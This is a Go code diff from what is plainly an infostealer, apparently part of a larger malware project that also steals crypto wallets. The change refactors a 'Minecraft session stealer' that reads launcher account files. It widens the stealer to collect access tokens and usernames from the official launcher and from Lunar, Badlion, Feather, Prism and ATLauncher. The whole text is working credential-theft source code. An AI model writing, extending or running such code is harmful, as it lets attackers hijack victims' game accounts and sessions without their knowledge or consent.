@@ -971,58 +971,113 @@ func stealAtomic() []WalletFile {
 
 // ── Minecraft session stealer ─────────────────────────────────────
 
+// mcAccountsJSON extracts tokens from a launcher_accounts.json style file.
+func mcAccountsJSON(data []byte, launcher string) []GameToken {
+	var out []GameToken
+	var j map[string]interface{}
+	if json.Unmarshal(data, &j) != nil {
+		return out
+	}
+	accounts, _ := j["accounts"].(map[string]interface{})
+	for _, v := range accounts {
+		acc, _ := v.(map[string]interface{})
+		if acc == nil {
+			continue
+		}
+		token, _ := acc["accessToken"].(string)
+		username := ""
+		if profile, ok := acc["minecraftProfile"].(map[string]interface{}); ok {
+			username, _ = profile["name"].(string)
+		}
+		if username == "" {
+			username, _ = acc["username"].(string)
+		}
+		if token != "" {
+			out = append(out, GameToken{Game: launcher, Type: "AccessToken", Username: username, Value: token})
+		}
+	}
+	return out
+}
+
+// mcProfilesJSON extracts tokens from a legacy launcher_profiles.json style file.
+func mcProfilesJSON(data []byte, launcher string) []GameToken {
+	var out []GameToken
+	var j map[string]interface{}
+	if json.Unmarshal(data, &j) != nil {
+		return out
+	}
+	authDB, _ := j["authenticationDatabase"].(map[string]interface{})
+	for _, v := range authDB {
+		entry, _ := v.(map[string]interface{})
+		if entry == nil {
+			continue
+		}
+		token, _ := entry["accessToken"].(string)
+		username, _ := entry["username"].(string)
+		if token != "" {
+			out = append(out, GameToken{Game: launcher, Type: "LegacyAccessToken", Username: username, Value: token})
+		}
+	}
+	return out
+}
+
 func stealMinecraft() []GameToken {
 	var out []GameToken
 	appdata := os.Getenv("APPDATA")
+	localAppdata := os.Getenv("LOCALAPPDATA")
 	if appdata == "" {
 		return out
 	}
-	mcDir := filepath.Join(appdata, ".minecraft")
 
-	// New launcher: launcher_accounts.json
-	accountsPath := filepath.Join(mcDir, "launcher_accounts.json")
-	if data, err := os.ReadFile(accountsPath); err == nil {
-		var j map[string]interface{}
-		if json.Unmarshal(data, &j) == nil {
-			if accounts, ok := j["accounts"].(map[string]interface{}); ok {
-				for _, v := range accounts {
-					acc, _ := v.(map[string]interface{})
-					if acc == nil {
-						continue
-					}
-					token, _ := acc["accessToken"].(string)
-					username := ""
-					if profile, ok := acc["minecraftProfile"].(map[string]interface{}); ok {
-						username, _ = profile["name"].(string)
-					}
-					if username == "" {
-						username, _ = acc["username"].(string)
-					}
-					if token != "" {
-						out = append(out, GameToken{Game: "Minecraft", Type: "AccessToken", Username: username, Value: token})
-					}
-				}
-			}
-		}
+	type launcherDef struct {
+		name         string
+		accountsPath string // launcher_accounts.json style
+		profilesPath string // launcher_profiles.json style (legacy)
 	}
 
-	// Legacy launcher: launcher_profiles.json
-	profilesPath := filepath.Join(mcDir, "launcher_profiles.json")
-	if data, err := os.ReadFile(profilesPath); err == nil {
-		var j map[string]interface{}
-		if json.Unmarshal(data, &j) == nil {
-			if authDB, ok := j["authenticationDatabase"].(map[string]interface{}); ok {
-				for _, v := range authDB {
-					entry, _ := v.(map[string]interface{})
-					if entry == nil {
-						continue
-					}
-					token, _ := entry["accessToken"].(string)
-					username, _ := entry["username"].(string)
-					if token != "" {
-						out = append(out, GameToken{Game: "Minecraft", Type: "LegacyAccessToken", Username: username, Value: token})
-					}
-				}
+	launchers := []launcherDef{
+		// Official launcher
+		{
+			name:         "Minecraft",
+			accountsPath: filepath.Join(appdata, ".minecraft", "launcher_accounts.json"),
+			profilesPath: filepath.Join(appdata, ".minecraft", "launcher_profiles.json"),
+		},
+		// Lunar Client
+		{
+			name:         "LunarClient",
+			accountsPath: filepath.Join(appdata, ".lunarclient", "settings", "game", "accounts.json"),
+		},
+		// Badlion Client
+		{
+			name:         "Badlion",
+			accountsPath: filepath.Join(appdata, "Badlion Client", "accounts.json"),
+		},
+		// Feather Client
+		{
+			name:         "Feather",
+			accountsPath: filepath.Join(appdata, "feather-client", "accounts.json"),
+		},
+		// Prism Launcher
+		{
+			name:         "Prism",
+			accountsPath: filepath.Join(appdata, "PrismLauncher", "accounts.json"),
+		},
+		// ATLauncher
+		{
+			name:         "ATLauncher",
+			accountsPath: filepath.Join(localAppdata, "ATLauncher", "accounts.json"),
+		},
+	}
+
+	for _, l := range launchers {
+		if l.accountsPath != "" {
+			if data, err := os.ReadFile(l.accountsPath); err == nil {
+				out = append(out, mcAccountsJSON(data, l.name)...)
+			}
+		}
+		if l.profilesPath != "" {
+			if data, err := os.ReadFile(l.profilesPath); err == nil {
+				out = append(out, mcProfilesJSON(data, l.name)...)
 			}
 		}
 	}
